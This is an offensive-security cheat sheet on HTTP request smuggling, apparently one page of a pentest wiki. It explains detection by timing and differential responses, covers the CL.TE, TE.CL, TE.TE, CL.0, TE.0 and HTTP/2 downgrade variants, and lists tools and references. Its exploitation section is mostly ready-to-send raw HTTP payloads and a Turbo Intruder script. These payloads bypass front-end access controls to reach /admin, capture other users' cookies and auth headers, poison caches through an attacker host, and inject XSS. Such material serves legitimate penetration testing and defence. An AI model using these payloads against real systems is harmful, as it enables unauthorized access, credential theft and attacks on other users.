# Request Smuggling

> **Summary**: Exploiting discrepancies in how front-end and back-end servers parse HTTP request boundaries (Content-Length vs Transfer-Encoding) to inject a second, hidden request.
> **Impact**: Bypass front-end security controls, poison web caches, steal credentials, achieve stored XSS, and hijack other users' requests.
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Infrastructure uses a reverse proxy/load balancer in front of a backend (multi-tier architecture)
- Backend and frontend are from different vendors (e.g., AWS ALB + IIS, Nginx + Apache)
- HTTP/2 frontend downgrading to HTTP/1.1 for the backend
- Timeouts or unexpected 400 errors when testing with conflicting CL/TE headers

### Automated Detection

```bash
# smuggler.py - automated desync detection
python3 smuggler.py -u <URL>

# Burp Suite Extensions
# - HTTP Request Smuggler (auto-detects CL.TE, TE.CL, TE.TE, H2.CL, CL.0)
# - HTTP Hacker (visualizes framing and concatenation)
```

### Manual Detection (Timing Technique)

**Detecting CL.TE**: Front-end uses CL, back-end uses TE. Send chunked body with CL set too short -- back-end waits for more chunks, causing a timeout:

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0

```

**Detecting TE.CL**: Front-end uses TE, back-end uses CL. Send chunked request where CL is shorter than actual content -- back-end waits for body that never arrives:

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

**Differential Response Analysis**: Send varied requests and observe if server responses differ unexpectedly, indicating parsing discrepancies.

## Exploitation

### Prerequisites

- Multi-tier HTTP architecture (proxy + backend) with connection reuse (keep-alive)
- Front-end and back-end disagree on request boundary parsing
- Disable `Update Content-Length` and `Normalize HTTP/1 line endings` in Burp Repeater

### Vulnerability Types

#### CL.TE (Front-end: Content-Length, Back-end: Transfer-Encoding)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

#### TE.CL (Front-end: Transfer-Encoding, Back-end: Content-Length)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /admin HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE (Obfuscated Transfer-Encoding)

One server fails to recognize the obfuscated header, falling back to CL:

| Obfuscation | Header |
|-------------|--------|
| Substring match | `Transfer-Encoding: testchunked` |
| Space in name | `Transfer-Encoding : chunked` |
| Horizontal tab | `Transfer-Encoding:\tchunked` |
| Vertical tab | `Transfer-Encoding:\x0bchunked` |
| Leading space | `Transfer-Encoding:  chunked` |
| Newline injection | `X: X\nTransfer-Encoding: chunked` |
| Duplicate header | Two `Transfer-Encoding` headers with different values |

#### CL.0 (Back-end ignores Content-Length)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

Backend treats CL as 0, leaving the body to be parsed as the next request.

#### TE.0 (Back-end ignores Transfer-Encoding)

```http
OPTIONS / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Connection: keep-alive

50
GET http://<COLLABORATOR>/ HTTP/1.1
x: X
0


```

### HTTP/2 Downgrade Smuggling

When the front-end receives HTTP/2 and rewrites to HTTP/1.1 for the backend:

#### H2.CL (Injected Content-Length in HTTP/2)

```http
POST /index.php HTTP/2
Host: <TARGET>
Content-Length: 0

POST /admin?action=promote HTTP/1.1
Foo: bar
```

The HTTP/2 frame carries both requests; after downgrade, the backend sees the injected second request.

#### H2.TE (Transfer-Encoding in HTTP/2 pseudo-headers)

Inject `Transfer-Encoding: chunked` in an HTTP/2 request; the frontend ignores it (HTTP/2 has its own framing), but after rewriting to HTTP/1.1, the backend processes chunked encoding.

### Browser-Powered Request Smuggling (Client-Side Desync)

- Abuses the victim's browser to send a mis-framed request on a shared connection
- Payload is constrained by what browsers can legally send cross-origin (no custom header obfuscation)
- Useful for cache poisoning and leaking front-end-injected headers
- Validate with the HTTP/2 nested-response check to confirm genuine server-side desync vs pipelining artifact

### Step-by-Step Exploitation

1. **Identify the desync type** -- Use timing or differential response techniques
   - Success: Timeout or unexpected response on second request
2. **Confirm exploitability** -- Smuggle a request to `/404` and check if a normal follow-up request returns 404
3. **Bypass front-end ACLs** -- Smuggle `GET /admin` past the proxy
4. **Reveal front-end rewriting** -- Smuggle a POST to an endpoint that echoes params; capture injected headers (e.g., `X-Forwarded-For`, internal auth headers)
5. **Steal credentials** -- Smuggle a request that stores the next user's request as a comment/parameter value
6. **Chain with cache poisoning** -- Poison a static resource by smuggling a redirect or XSS payload

### Exploitation Scenarios

#### Bypass Front-End Security (CL.TE)

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 67
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

#### Capture Other Users' Requests

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 319
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: <TARGET>
Content-Length: 400
Content-Type: application/x-www-form-urlencoded

comment=
```

The next user's entire request (including cookies/auth headers) is stored as the comment.

#### Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: <ATTACKER>
Content-Length: 10

x=1
```

Poisons `/static/include.js` with an attacker-controlled redirect.

#### Reflected XSS via User-Agent Smuggling

```http
POST / HTTP/1.1
Host: <TARGET>
Transfer-Encoding: chunked
Content-Length: 213

0

GET /post?postId=2 HTTP/1.1
Host: <TARGET>
User-Agent: "><script>alert(1)</script>
Content-Length: 10

A=
```

### Proof of Concept

Use Turbo Intruder for reliable timing:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    engine.start()
    attack = '''POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nHost: <TARGET>\r\nContent-Length: 35\r\n\r\n0\r\n\r\nGET /admin7 HTTP/1.1\r\nX-Foo: k'''
    engine.queue(attack)
    for i in range(14):
        engine.queue('''GET / HTTP/1.1\r\nHost: <TARGET>\r\n\r\n''')
        time.sleep(0.05)
```

## Bypasses

- **Hop-by-hop header abuse**: `Connection: Content-Length` -- instructs the proxy to strip CL, enabling desync
- **HTTP/0.9 response**: If backend supports HTTP/0.9, response has no headers, allowing XSS even with `Content-Type: text/plain`
- **TRACE method abuse**: Smuggle HEAD + TRACE to reflect arbitrary headers in the response body

## Escalation

- Smuggling -> [Cache Poisoning](cache-poisoning.md) -> Stored XSS on all users
- Smuggling -> Credential theft -> Account takeover
- Smuggling -> [SSRF](ssrf.md) -> Access internal services via Host header injection
- Smuggling -> Front-end bypass -> Access to `/admin` or internal endpoints

## Distinguishing Smuggling from Pipelining

| Check | How |
|-------|-----|
| Disable reuse | Turn off HTTP/1 connection reuse in Burp; if behavior disappears, it was pipelining |
| HTTP/2 nested response | If HTTP/2 response body contains a nested HTTP/1 response, it is genuine desync |
| Different connections | Send attack and normal requests on separate TCP connections |

## Tools

| Tool | Usage |
|------|-------|
| [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) | Burp extension -- auto-detects desync variants |
| [smuggler.py](https://github.com/defparam/smuggler) | `python3 smuggler.py -u <URL>` |
| [smugglefuzz](https://github.com/Moopinger/smugglefuzz) | Fuzzer for smuggling variants |
| [t-reqs](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer) | Grammar-based HTTP fuzzer for discrepancy detection |
| [HTTP Hacker](https://portswigger.net/bappstore) | Burp extension -- visualize framing and concatenation |
| Turbo Intruder | Precise control over connection reuse (`requestsPerConnection`) |

## References

- [PortSwigger - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger Research - HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [PortSwigger Research - Browser-Powered Desync](https://portswigger.net/research/browser-powered-desync-attacks)
- [PortSwigger Research - HTTP/1 Must Die](https://portswigger.net/research/http1-must-die)
- [PortSwigger Research - TRACE Desync Attack](https://portswigger.net/research/trace-desync-attack)
- [TE.0 on Google Cloud (Bugcrowd)](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- [A Pentester's Guide to HTTP Request Smuggling](https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)
- [PayloadsAllTheThings - Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)

**See also**: [Cache Poisoning](cache-poisoning.md) | [SSRF](ssrf.md) | [CORS](cors.md)
